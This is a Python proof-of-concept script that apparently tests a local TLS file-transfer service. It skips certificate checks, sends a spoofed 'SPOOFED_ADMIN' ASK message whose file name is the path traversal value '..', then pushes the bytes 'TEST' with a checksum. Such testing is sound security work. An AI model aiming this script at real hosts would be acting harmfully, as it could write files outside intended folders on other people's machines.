import socket
import ssl
import json
import struct

PORT = 43511
ADDR = '127.0.0.1'

def spoof_ask():
    # Context to allow self-signed certificates (don't verify)
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((ADDR, PORT)) as sock:
        with context.wrap_socket(sock, server_hostname=ADDR) as ssock:
            print(f"[*] TLS Handshake complete with {ADDR}:{PORT}")

            # Spoofed Message::Ask with path traversal attempt
            msg = {
                "type": "ASK",
                "version": 1,
                "transfer_id": "traversal-123",
                "sender_name": "SPOOFED_ADMIN",
                "file_name": "..",
                "size_bytes": 4
            }

            json_msg = json.dumps(msg).encode('utf-8')
            length = len(json_msg)
            
            # Send length-prefixed message (Big Endian u32)
            ssock.sendall(struct.pack('>I', length))
            ssock.sendall(json_msg)
            print("[*] Spoofed ASK (traversal) sent.")

            # Read response
            len_buf = ssock.recv(4)
            if len_buf:
                resp_len = struct.unpack('>I', len_buf)[0]
                resp_data = ssock.recv(resp_len)
                print(f"[*] Received response: {resp_data.decode('utf-8')}")

                if '"status":"ACCEPTED"' in resp_data.decode('utf-8'):
                    # Send bytes
                    content = b"TEST"
                    ssock.sendall(content)
                    
                    # Send DONE with checksum
                    import hashlib
                    checksum = hashlib.sha256(content).hexdigest()
                    done_msg = {
                        "type": "DONE",
                        "checksum_sha256": checksum
                    }
                    done_json = json.dumps(done_msg).encode('utf-8')
                    ssock.sendall(struct.pack('>I', len(done_json)))
                    ssock.sendall(done_json)
                    print("[*] DONE sent.")

                    # Read final response
                    len_buf = ssock.recv(4)
                    if len_buf:
                        resp_len = struct.unpack('>I', len_buf)[0]
                        resp_data = ssock.recv(resp_len)
                        print(f"[*] Final ACK: {resp_data.decode('utf-8')}")

if __name__ == "__main__":
    try:
        spoof_ask()
    except Exception as e:
        print(f"[!] Error: {e}")
